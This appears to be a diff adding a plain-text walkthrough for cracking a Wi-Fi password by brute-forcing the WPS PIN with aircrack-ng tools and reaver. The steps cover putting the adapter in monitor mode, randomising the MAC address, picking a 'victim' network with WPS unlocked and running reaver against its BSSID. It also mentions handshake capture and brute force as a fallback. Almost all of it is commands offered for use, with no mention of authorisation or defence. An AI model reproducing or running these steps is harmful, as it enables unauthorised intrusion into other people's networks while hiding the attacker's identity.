@@ -1,0 +1,69 @@
+Run as superuser
+You'll need
+- AWUS036H
+- aircrack-ng
+- macchanger
+- reaver
+
+ 1) Wifi adapter
+    Find out how your wifi adapter is called. Run
+    # airmon-ng
+    I call it $w here.
+
+ 2) Start monitor mode
+    # airmon-ng start $w
+    You might want to killall the processes that might cause problems. But it
+    could also work just like that, I haven't tried it. Run
+    # airmon-ng stop $w
+    to stop monitor mode. See what you have with
+    # airmon-ng
+    We'll be using mon0 from now on and I call it $m
+    Type
+    # iwconfig
+    for more information
+    If you get an error message saying
+    > SIOCSIFFLAGS: Operation not possible due to RF-kill
+    run
+    # rfkill list
+    # rfkill unblock wifi
+
+ 3) Change MAC addresses (This step can be omitted.)
+    Turn off adapters
+    # ifconfig $w down
+    # ifconfig $m down
+    Change MAC to whatever you like
+    # macchanger -r $w
+    # macchanger -r $m
+    Turn the adapters on again
+    # ifconfig $w up
+    # ifconfig $m up
+
+ 4) See what's out there
+    # airodump-ng $m
+    If TKIP is used as authorisation method, reaver won't work.
+
+ 5) Find out if victim is vulnerable
+    To crack the wifi password, the wifi needs to have Wi-Fi Protected Setup
+    (WPS) enabled. Only this allows the WPA or WPA2 security to be bypassed. If
+    WPS is not enabled, you can try a hand-shake with the wifi and then brute-
+    force the password (see e.g. https://www.youtube.com/watch?v=OSfz30sr2Xw)
+    Let's see if WPS is enabled with
+    # wash -i $m
+    WPS Locked needs to show "No". Write down the BSSID from your victim, I will
+    call it $bssid. You will also need the channel $channel.
+    The wash command should list reachable wifis within a few seconds. If it
+    produces no output, you might try to create /usr/etc/reaver. See
+    https://aur.archlinux.org/packages/reaver/ or
+    https://forums.kali.org/showthread.php?89-Problem-with-wash for more
+    information.
+
+ 6) Crack the WPS pin
+    # reaver -i $m -b $bssid -c $channel -a -S -N -vv
+    If you get
+    > WARNING: Failed to associate with $bssid
+    run
+    # wash -i $m
+    again. If you can't see the victim's wifi, then you might to start all over
+    again.
+    Reaver needs to try ~11000 pins. If you find the correct pin, you'll have
+    the password. This can take anything from seconds to hours.
